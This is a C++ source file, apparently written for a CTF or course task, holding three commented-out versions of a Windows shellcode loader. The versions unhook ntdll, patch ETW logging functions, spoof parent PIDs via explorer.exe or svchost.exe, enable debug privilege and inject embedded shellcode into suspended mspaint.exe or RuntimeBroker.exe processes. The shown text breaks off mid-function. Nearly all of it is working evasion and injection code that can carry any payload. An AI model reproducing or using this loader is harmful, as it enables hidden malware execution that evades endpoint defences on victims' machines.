/*#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib") // 如果環境沒有，需要動態獲取 ntdll 函數

// 定義需要的結構與常數
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

// 填入你用 Donut 生成的 C# Payload Shellcode
unsigned char payload_shellcode[] = {
    // !!! 在這裡貼上你的 payload.bin 的 HEX 內容 !!!
    // 例如: 0xE8, 0x00, 0x00, ... 
    //0x90, 0x90, 0x90 // 範例 NOPs，請務必替換
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

// --- 技術 1: API Unhooking (Reloading NTDLL) ---
// 原理：讀取硬碟上的 ntdll.dll，並覆蓋記憶體中被 EDR Hook 的 .text 段
void UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return; }

    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hFileMapping); CloseHandle(hFile); return; }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pDosHeader->e_lfanew);

    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeader) + (DWORD_PTR)(IMAGE_SIZEOF_SECTION_HEADER * i));

        // 找到 .text 區段
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSection->VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pSection->VirtualAddress);

            // 修改記憶體權限為可寫
            VirtualProtect(pDest, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            // 覆蓋乾淨的代碼
            memcpy(pDest, pSrc, pSection->Misc.VirtualSize);
            // 還原權限
            VirtualProtect(pDest, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            std::cout << "[+] API Unhooking: ntdll.dll .text section refreshed." << std::endl;
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

// --- 技術 2: ETW Patching (Updated) ---
// 原理：
// 1. EtwEventWrite: 修改為 return 0，讓寫入操作失效但回傳成功。
// 2. EtwEventRegister: 修改為 return 0，假裝註冊成功，但實際上沒有註冊任何 Provider。
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cout << "[-] Failed to get handle to ntdll.dll" << std::endl;
        return;
    }

    // ---------------------------------------------------------
    // Target 1: EtwEventWrite
    // ---------------------------------------------------------
    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

        // x64 Assembly: xor eax, eax; ret
        // Opcode: 33 C0 C3
        // 回傳 STATUS_SUCCESS (0)
        unsigned char patch[] = { 0x33, 0xC0, 0xC3 };

        memcpy(pEtwEventWrite, patch, sizeof(patch));

        VirtualProtect(pEtwEventWrite, 5, oldProtect, &oldProtect);
        std::cout << "[+] ETW Patching: EtwEventWrite disabled." << std::endl;
    }

    // ---------------------------------------------------------
    // Target 2: EtwEventRegister (新增部分)
    // ---------------------------------------------------------
    void* pEtwEventRegister = GetProcAddress(hNtdll, "EtwEventRegister");
    if (pEtwEventRegister) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventRegister, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

        // x64 Assembly: xor eax, eax; ret
        // Opcode: 33 C0 C3
        // 同樣回傳 STATUS_SUCCESS (0)，讓程式以為註冊成功了，
        // 但實際上 kernel 端沒有建立任何 handle。
        unsigned char patch[] = { 0x33, 0xC0, 0xC3 };

        memcpy(pEtwEventRegister, patch, sizeof(patch));

        VirtualProtect(pEtwEventRegister, 5, oldProtect, &oldProtect);
        std::cout << "[+] ETW Patching: EtwEventRegister disabled." << std::endl;
    }
}

// 輔助函數：找 Explorer 的 PID
DWORD GetTargetParentPID() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (wcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {

    // 隱藏 Console (選擇性，若要看 Log 可註解掉)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::cout << "[*] Starting Loader..." << std::endl;

    // 1. 先做自我防護：Unhook 和 Patch ETW
    UnhookNtdll();
    BypassETW();

    // 2. 準備 PPID Spoofing
    DWORD parentPid = GetTargetParentPID();
    if (parentPid == 0) {
        std::cout << "[-] Failed to find explorer.exe" << std::endl;
        return 1;
    }
    std::cout << "[+] Target Parent found: explorer.exe (PID: " << parentPid << ")" << std::endl;

    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    // 初始化屬性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    // 打開 Parent Process
    HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParentProcess) {
        std::cout << "[-] Failed to open parent process." << std::endl;
        return 1;
    }

    // 設定 PPID 屬性
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        std::cout << "[-] Failed to update proc attribute." << std::endl;
        return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // 3. 啟動目標進程 (mspaint) 並掛起 (Suspended)
    // 這樣在 Task Manager 中看起來是 explorer.exe -> mspaint.exe
    std::cout << "[*] Spawning mspaint.exe suspended with spoofed PPID..." << std::endl;
    if (!CreateProcessA(NULL, (LPSTR)"mspaint.exe", NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        std::cout << "[-] CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 4. Process Injection (Remote Thread Injection)
    std::cout << "[*] Injecting payload into PID: " << pi.dwProcessId << std::endl;

    // 分配記憶體
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cout << "[-] VirtualAllocEx failed." << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 寫入 Shellcode
    if (!WriteProcessMemory(pi.hProcess, remoteMem, payload_shellcode, sizeof(payload_shellcode), NULL)) {
        std::cout << "[-] WriteProcessMemory failed." << std::endl;
        return 1;
    }

    // 建立遠端執行緒 (為了符合題目 "CreateRemoteThread")
    // 這裡也可以使用 QueueUserAPC (Early Bird)，但 CreateRemoteThread 最直觀
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        std::cout << "[-] CreateRemoteThread failed." << std::endl;
        return 1;
    }

    // 5. 恢復執行 (Resume)
    // 因為我們用了 CreateRemoteThread，Shellcode 會在新線程跑。
    // 原本的 mspaint 主線程還在 Suspended，我們可以恢復它讓 mspaint 介面跑出來掩人耳目，
    // 或者就讓它掛著。通常為了隱蔽，我們會 ResumeMainThread。
    //ResumeThread(pi.hThread);
    
    if (hThread) {
        std::cout << "[+] Shellcode thread created." << std::endl;
        // 3. [Critical] 重要技巧：不要 ResumeThread(pi.hThread)
        // mspaint 的主執行緒負責繪製 UI 視窗。如果我們不恢復它，
        // mspaint 就會一直處於掛起狀態，視窗永遠不會出現。
        // 但我們剛剛建立的 RemoteThread (Shellcode) 仍然會跑！

        // ResumeThread(pi.hThread);  <-- 註解掉這行

        // 等待 Shellcode 執行緒結束 (可選，視需求而定)
        // WaitForSingleObject(hThread, INFINITE);
    }

    std::cout << "[+] Injection Complete! Check your server for flags." << std::endl;

    // 清理
    CloseHandle(hParentProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hThread);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return 0;
}*/




/*
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib") 

// 定義需要的結構與常數
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

// 你的 Shellcode (必須是 EXITFUNC=thread)
unsigned char payload_shellcode[] = {
    // 範例 NOPs，請填入你的 Payload
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

// [新增] 啟用 Debug 權限 (操作 svchost 必須)
bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    return true;
}

// [API Unhooking]
void UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return; }
    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hFileMapping); CloseHandle(hFile); return; }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pDosHeader->e_lfanew);

    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeader) + (DWORD_PTR)(IMAGE_SIZEOF_SECTION_HEADER * i));
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSection->VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pSection->VirtualAddress);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(pDest, pSrc, pSection->Misc.VirtualSize);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

// [ETW Patching - Updated]
// 新增 EtwEventRegister Patch
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    // xor eax, eax; ret  (Return 0 / STATUS_SUCCESS)
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };

    // 1. Patch EtwEventWrite (防止寫入 Log)
    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, 5, oldProtect, &oldProtect);
    }

    // 2. Patch EtwEventRegister (防止註冊新的 Provider)
    // 這樣程式會以為註冊成功，但實際上沒有獲得有效的 Handle，後續的 Log 行為也會失效
    void* pEtwEventRegister = GetProcAddress(hNtdll, "EtwEventRegister");
    if (pEtwEventRegister) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventRegister, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pEtwEventRegister, patch, sizeof(patch));
        VirtualProtect(pEtwEventRegister, 5, oldProtect, &oldProtect);
    }
}

// [優化] 獲取 svchost 的 Handle
// 遍歷所有 svchost，直到找到一個權限允許打開的 (避免 PPL 保護的 svchost 導致失敗)
HANDLE GetTargetParentHandle(DWORD* outPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE hProcess = NULL;

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (wcscmp(pe32.szExeFile, L"svchost.exe") == 0) {
                    hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        *outPid = pe32.th32ProcessID;
                        break;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return hProcess;
}

int main() {
    // 隱藏 Console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 1. 啟用 Debug 權限 (重要：否則無法操作 svchost)
    EnableDebugPrivilege();

    // 2. 自我隱藏 (Evasion)
    UnhookNtdll();
    BypassETW();

    // 3. 尋找並打開 svchost
    DWORD parentPid = 0;
    HANDLE hParentProcess = GetTargetParentHandle(&parentPid);

    if (!hParentProcess) {
        // 如果連這裡都失敗，請確認是否以「系統管理員身分」執行
        return 1;
    }

    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    // 使用 RuntimeBroker.exe (安全、無害)
    char targetPath[] = "C:\\Windows\\System32\\RuntimeBroker.exe";

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        return 1;
    }

    // 分配記憶體與寫入 Shellcode
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteMem, payload_shellcode, sizeof(payload_shellcode), NULL)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // 建立遠端執行緒
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

    if (hThread) {
        // 射後不理
        ResumeThread(pi.hThread);
        CloseHandle(hThread);
    }
    else {
        TerminateProcess(pi.hProcess, 1);
    }

    // 清理資源
    CloseHandle(hParentProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return 0;
}*/






/*
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h> 

#pragma comment(lib, "ntdll.lib") 

// 設定為 Windows 子系統 (GUI)，支援混合模式
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

// Shellcode: Execute "notepad.exe" (x64) & ExitThread
// 這是用來驗證父子進程關係的最佳測試彈頭
unsigned char payload_shellcode[] = {
    0x3f, 0x8b, 0x40, 0x27, 0x33, 0x2b, 0x03, 0xc3, 0xc3, 0xc3, 0x82, 0x92, 0x82, 0x93, 0x91, 0x92,
    0x95, 0x8b, 0xf2, 0x11, 0xa6, 0x8b, 0x48, 0x91, 0xa3, 0x8b, 0x48, 0x91, 0xdb, 0x8b, 0x48, 0x91,
    0xe3, 0x8b, 0x48, 0xb1, 0x93, 0x8b, 0xcc, 0x74, 0x89, 0x89, 0x8e, 0xf2, 0x0a, 0x8b, 0xf2, 0x03,
    0x6f, 0xff, 0xa2, 0xbf, 0xc1, 0xef, 0xe3, 0x82, 0x02, 0x0a, 0xce, 0x82, 0xc2, 0x02, 0x21, 0x2e,
    0x91, 0x82, 0x92, 0x8b, 0x48, 0x91, 0xe3, 0x48, 0x81, 0xff, 0x8b, 0xc2, 0x13, 0x48, 0x43, 0x4b,
    0xc3, 0xc3, 0xc3, 0x8b, 0x46, 0x03, 0xb7, 0xa4, 0x8b, 0xc2, 0x13, 0x93, 0x48, 0x8b, 0xdb, 0x87,
    0x48, 0x83, 0xe3, 0x8a, 0xc2, 0x13, 0x20, 0x95, 0x8b, 0x3c, 0x0a, 0x82, 0x48, 0xf7, 0x4b, 0x8b,
    0xc2, 0x15, 0x8e, 0xf2, 0x0a, 0x8b, 0xf2, 0x03, 0x6f, 0x82, 0x02, 0x0a, 0xce, 0x82, 0xc2, 0x02,
    0xfb, 0x23, 0xb6, 0x32, 0x8f, 0xc0, 0x8f, 0xe7, 0xcb, 0x86, 0xfa, 0x12, 0xb6, 0x1b, 0x9b, 0x87,
    0x48, 0x83, 0xe7, 0x8a, 0xc2, 0x13, 0xa5, 0x82, 0x48, 0xcf, 0x8b, 0x87, 0x48, 0x83, 0xdf, 0x8a,
    0xc2, 0x13, 0x82, 0x48, 0xc7, 0x4b, 0x8b, 0xc2, 0x13, 0x82, 0x9b, 0x82, 0x9b, 0x9d, 0x9a, 0x99,
    0x82, 0x9b, 0x82, 0x9a, 0x82, 0x99, 0x8b, 0x40, 0x2f, 0xe3, 0x82, 0x91, 0x3c, 0x23, 0x9b, 0x82,
    0x9a, 0x99, 0x8b, 0x48, 0xd1, 0x2a, 0x94, 0x3c, 0x3c, 0x3c, 0x9e, 0x8b, 0x79, 0xc2, 0xc3, 0xc3,
    0xc3, 0xc3, 0xc3, 0xc3, 0xc3, 0x8b, 0x4e, 0x4e, 0xc2, 0xc2, 0xc3, 0xc3, 0x82, 0x79, 0xf2, 0x48,
    0xac, 0x44, 0x3c, 0x16, 0x78, 0x33, 0x76, 0x61, 0x95, 0x82, 0x79, 0x65, 0x56, 0x7e, 0x5e, 0x3c,
    0x16, 0x8b, 0x40, 0x07, 0xeb, 0xff, 0xc5, 0xbf, 0xc9, 0x43, 0x38, 0x23, 0xb6, 0xc6, 0x78, 0x84,
    0xd0, 0xb1, 0xac, 0xa9, 0xc3, 0x9a, 0x82, 0x4a, 0x19, 0x3c, 0x16, 0xa0, 0xa2, 0xaf, 0xa0, 0xed,
    0xa6, 0xbb, 0xa6, 0xc3,
};

// Console Setup
bool SetupConsole() {
    if (AttachConsole(ATTACH_PARENT_PROCESS)) {
        FILE* fp;
        freopen_s(&fp, "CONOUT$", "w", stdout);
        freopen_s(&fp, "CONOUT$", "w", stderr);
        return true;
    }
    return false;
}

// Debug Privilege
bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return false; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { CloseHandle(hToken); return false; }
    CloseHandle(hToken);
    return true;
}

// API Unhooking
void UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return; }
    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hFileMapping); CloseHandle(hFile); return; }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pDosHeader->e_lfanew);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeader) + (DWORD_PTR)(IMAGE_SIZEOF_SECTION_HEADER * i));
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pSection->VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pSection->VirtualAddress);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(pDest, pSrc, pSection->Misc.VirtualSize);
            VirtualProtect(pDest, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

// ETW Patching
void BypassETW() {
